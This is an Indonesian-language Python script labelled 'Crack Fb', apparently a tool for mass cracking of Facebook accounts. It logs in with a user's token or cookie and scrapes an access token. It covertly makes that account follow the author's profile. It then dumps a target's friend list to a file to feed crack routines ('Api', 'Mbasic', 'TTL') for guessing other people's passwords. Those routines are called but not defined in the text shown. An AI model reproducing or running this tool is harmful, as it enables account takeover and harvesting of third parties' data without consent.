#!/usr/bin/python3
import os,requests,mechanize,subprocess,bs4,sys,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress,webbrowser, calendar
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()
days = current.strftime("%A")

print("install Modul dulu Bro...")
os.system("pip2 install mechanize")
os.system("pip2 install futures")
os.system("pip2 install bs4")
os.system("pip2 install requests")
os.system('pip2 install futures')
print("SUDAH SELESAI...")
os.system('clear')

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""
        
        
#warna     
p = "\x1b[0;37m" #putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda
pk = "\x1b[1;95m"#pink      

#banner
def banner():
    print("""\x1b[0;32m   ___                   \n  / _ \_______           \n / ___/ __/ -_) Crack Fb^^   ≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈\n/_/  /_/__\__/(_) Versi 3.1  │            Mr.BotHans           │  \n       /  ^ \/ / // /  ^ \   │   •• Script MBF premium♥ ••    │  \n      /_/_/_/_/\_,_/_/_/_/   |    Hari Ini Hari """, days,"""
                             ≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈
    
    
    """)
    




host="https://free.facebook.com"
ok = []
cp = []
ttl =[]










durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def mengetik(s):
	for c in s + "\n":
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(random.random() * 0.4)



def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
	
#def lang(cookies)
def cokies(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://free.facebook.com/language.php",headers=coli(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://free.facebook.com/"+i.get("href"),cookies=cookies,headers=coli())
			b=requests.get("https://free.facebook.com/profile.php",headers=coli(),cookies=cookies).text	
			if "cokk" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Cokies Salah Tolong Masukan Cookies yang benar....")
		
#def basecookie()
def ngocok():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return dict_cookies(open('.cok').read().strip())
		else:login()
	else:login()

#def hdcok()
def coli():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
#def get_cookies(cookies)
def ambil_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

#def gets_dict_cookies(cookies)
def dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result



#def country()
def server():
    os.system("clear")
    banner()
    print("\n%sCrack FB Negara => "%(h))
    print("====================")
    print("%s{%s01%s} %sAkun Indo"%(m,p,m,p))
    print("%s{%s02%s} %sAkun India"%(m,p,m,p))
    print("%s{%s00%s} %sKeluar"%(m,p,m,p))
    print("%s≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠"%(h))
    pilih_server()
 
#def choose_country()   
def pilih_server():
    cc = input("\n%s[%s•%s] %s==>%s  "%(m,p,m,h,p))
    if cc in[""]:
        print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
        mengetik("Loading. . . . . . . . . . . . . 100%")
        print((h+"\n["+p+"!"+h+"]"+m+" Masukan Salah Satuu Bro.."))
        time.sleep(2)
        server()
    elif cc == '1' or cc == '01':
        print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
        mengetik("Loading . . . . . . . . . . . . . 100%")
        os.system("rm -rf country.txt")
        cou = "id"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
            
    elif cc == '2' or cc == '02':
        print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
        mengetik("Loading. . . . . . . . . . . . . . 100%")
        os.system("rm -rf country.txt")
        cou = "bd"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc == '0' or cc == '00':
        print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
        mengetik("Loading. . . . . . . . . . . . . . 100%")
        sys.exit()
        
#def logs()
def login():
  os.system("clear")
  banner()
  print((h+"ANDA HARU MASUK DULU UNTUK HACK FB"))
  print((h+"\n["+p+"1"+h+"]"+p+" Pakai Token"))
  print((h+"["+p+"2"+h+"]"+p+" Pakai Cookies"))
  print((h+"["+p+"3"+h+"]"+p+" Ambil Token"))
  print((h+"["+p+"4"+h+"]"+p+" Ambil Cookies"))
  print((h+"["+p+"0"+h+"]"+p+" Exit"))
  sek=input(h+"\n["+p+"•"+h+"]"+p+" ≈≈≈> ")
  if sek=="":
    print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
    mengetik("Loading. . . . . . . . . . . . . . 100%")
    print((h+"\n["+p+"!"+h+"]"+m+" Masukan salah satu bro"))
    time.sleep(2)
    login()
  elif sek=="1":
    print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
    mengetik("Loading. . . . . . . . . . . . . . 100%")
    defaultua()
    logtok()
  elif sek=="2":
    
    print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
    mengetik("Loading. . . . . . . . . . . . . 100%")
    defaultua()
    gen()
  elif sek=='3':
    
    print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
    mengetik("Loading. . . . . . . . . . . . . 100%")
    ul = 'https://m.youtube.com/watch?v=s0w16h2-fyc'
    webbrowser.open(ul)
    login()	
    
  elif sek=='4':
    print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
    mengetik("Loading. . . . . . . . . . . . . . 100%")
    ur = 'https://m.youtube.com/watch?v=F1a7uLwfCao'
    webbrowser.open(ur)
    login()
   	
   	
   	
   	
  elif sek=="0":
    print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
    mengetik("Loading. . . . . . . . . . . . . . 100%")
    exit()
  else:
    print("%sMohon%s Tunggu%s Sebebtar.."%(m,k,h))
    mengetik("Loading. . . . . . . . . . . . . . 100%")
    print((h+"\n["+p+"!"+h+"]"+m+" Masukan Yang bener bro.."))
    time.sleep(1)
    login()
    
    
#def log_token()
def logtok():
    os.system("clear")
    banner()
    toket = input(h+"\n["+p+"•"+h+"]"+p+" Masukan Token ~> ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((h+"\n["+p+"•"+h+"]"+h+" Identitas Token Anda Dikenali..."))
        follow()
    except KeyError:
        print((h+"["+p+"!"+h+"]"+m+" Identitas Token Anda Tidak Tidak dikenali"))
        os.system("clear")
        login()
        
def gen():
        os.system("clear")
        banner()
        cookie = input(h+"\n["+p+"•"+h+"]"+p+" Masukan Cookies ~> ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+", # kehokian masing masing
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((h+"["+p+"!"+h+"]"+m+" Silahkan Priksa Koneksi Internet anda!"))
        except [KeyError,IOError]:
            print((h+"["+p+"!"+h+"]"+m+" Identitas Cookies Anda Tidak dikenali !"))
            os.system("clear")
            login()
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((h+"\n["+p+"•"+h+"]"+h+" Identitas Cookies Anda Dikenali"))
        follow()
        
#def bot_folloe()     
def follow():
	try:
		toket=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((h+"\n["+p+"!"+h+"]"+m+" Identitas Token Tidak Dikenali !"))
		login()
	jalan("%s[%s•%s] %sTunggu sebentar ..."%(h,p,h,p))
	requests.post("https://graph.facebook.com/100004421651592/subscribers?access_token=" + toket)      # Mr. BotHan

#Jangan Diubahh Bangsatt,Kalo mau tambahin silahkann

	menu()
	
def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e))
        login()
    ip = requests.get("https://api.ipify.org").text
    ngr = open('country.txt', 'r').read()
    if "id" in ngr:
        negara = "Indo"
    elif "bd" in ngr:
        negara = "India"
        
    os.system("clear")
    banner()
    
    print((m+"==========[ "+p+"Selamat Datang "+a["name"]+m+" ]=========="+p))
    print((m+"["+p+"•"+m+"]"+h+" ID FB           : "+m+"{  "+p+id))
    print((m+"["+p+"•"+m+"]"+h+" Alamat IP       : "+m+"{  "+p+ip))
    print((m+"["+p+"•"+m+"]"+h+" Status Join     : "+m+"{  "+p+"Free"))
    print((m+"["+p+"•"+m+"]"+h+" Bergabung Pada  : "+m+"{  "+p+durasi))
    print((m+"["+p+"•"+m+"]"+h+" Hack Negara     : "+m+"{  "+p+negara))
    print(m,50*"=")
    print((o+"\n["+p+"1"+o+"]"+p+" Crack Pakai ID Public/Teman"))
    print((o+"["+p+"2"+o+"]"+p+" Crack Pakai ID Follower"))
    print((o+"["+p+"3"+o+"]"+p+" Crack Pakai ID Like Postingan"))
    print((o+"["+p+"4"+o+"]"+p+" Crack Pakai NOMOR"))
    print((o+"["+p+"5"+o+"]"+p+" Crack Pakai EMAIL"))
    print((o+"["+p+"6"+o+"]"+p+" AmbilData Target"))
    print((o+"["+p+"7"+o+"]"+p+" Haail Crack"))
    print((o+"["+p+"8"+o+"]"+p+" User Agent"))
    print((o+"["+p+"0"+o+"]"+p+" Keluar"))
    pilihan_menu()
    
def pilihan_menu():
    
	r=input(o+"\n["+p+"•"+o+"]"+p+" ≈≈> : ")
	if r=="":
		print((h+"["+p+"!"+h+"]"+m+" Masukan Salah Satu Bro"))
		time.sleep(2)
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		likers()
	elif r=="4":
		random_numbers()
	elif r=="5":
		random_email()
	elif r=="6":
		target()
	elif r=="7":
		ress()
	elif r=="8":
		menu_user_agent()
	elif r=="0":
			try:
			    jalan(o+"\n["+p+"•"+o+"]"+p+" Trima Kasih Telah Menggunakan Scriptnya,Jika Mau Donasi Silahkan Hubungi Admin,Biar Admin Bisa Update Script Ini")
			    os.system("rm -rf login.txt")
			    os.system("termux-open-url https://www.facebook.com/OLDFB.01")
			    exit()
			except Exception as e:
			 	print((h+"["+p+"!"+h+"]"+m+" Erorr %s"%e))
	else:
		    print((h+"["+p+"!"+h+"]"+m+" Masukan Yang Bener Broo"))
		    menu()
#def pilihcrack(file)	
def ngecrack(file):
  print((o+"\n["+p+"1"+o+"]"+m+" Api "+m+"("+p+"Fast"+m+")"))
  print((o+"["+p+"2"+o+"]"+m+" Api + TTL "+m+"("+p+"Fast"+m+")"))
  print((o+"["+p+"3"+o+"]"+b+" Mbasic "+m+"("+p+"Slow"+m+")"))
  print((o+"["+p+"4"+o+"]"+b+" Mbasic + TTL "+m+"("+p+"Slow"+m+")"))
  print((o+"["+p+"5"+o+"]"+k+" Free Facebook "+m+"("+p+"Super Slow"+m+")"))
  han=input(o+"\n["+p+"•"+o+"]"+p+" ==> ")
  if han in[""]:
    print((h+"["+p+"!"+h+"]"+m+" Pilih Salah satu bro"))
    time.sleep(2)
    ngecrack(file)
  elif han in["1","01"]:
    bapi(file)
  elif han in["2","02"]:
    bapittl(file)
  elif han in["3","03"]:
    crack(file)
  elif han in["4","04"]:
    crackttl(file)
  elif han in["5","05"]:
    crackffb(file)
  else:
    print((h+"["+p+"!"+h+"]"+m+" Masukan Yang Bener bro.."))
    ngecrack(file)
    
    
### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((h+"\n["+p+"!"+h+"]"+m+" Cookie/Token Tidak Dikenali"))
		time.sleep(2)
		os.system("rm -rf login.txt")
		login()
	try:
		print((o+"\n["+p+"•"+o+"]"+p+" Apakah Anda Ingin Crack Dari Daftar Teman Anda ?"))
		print((o+"["+p+"•"+o+"]"+p+"Jika Iya Maka Ketik 'me'Jika Tidak Maka Masukan ID Target\n"))
		idt = input(o+"["+p+"•"+o+"]"+h+" Masukan ~> "+p)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((o+"["+p+"•"+o+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((h+"["+p+"!"+h+"]"+m+" Tidak Ada ID Yang Tersedia"))
			print((h+"\n[ "+m+"Back"+h+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((o+"["+p+"•"+o+"]"+p+" ID Yang Tersedia : %s"%(len(id))))
		return ngecrack(qq)
	except Exception as e:
		exit(h+"["+p+"!"+h+"]"+m+" Error : %s"%e)

if __name__=="__main__":
	os.system("git pull")
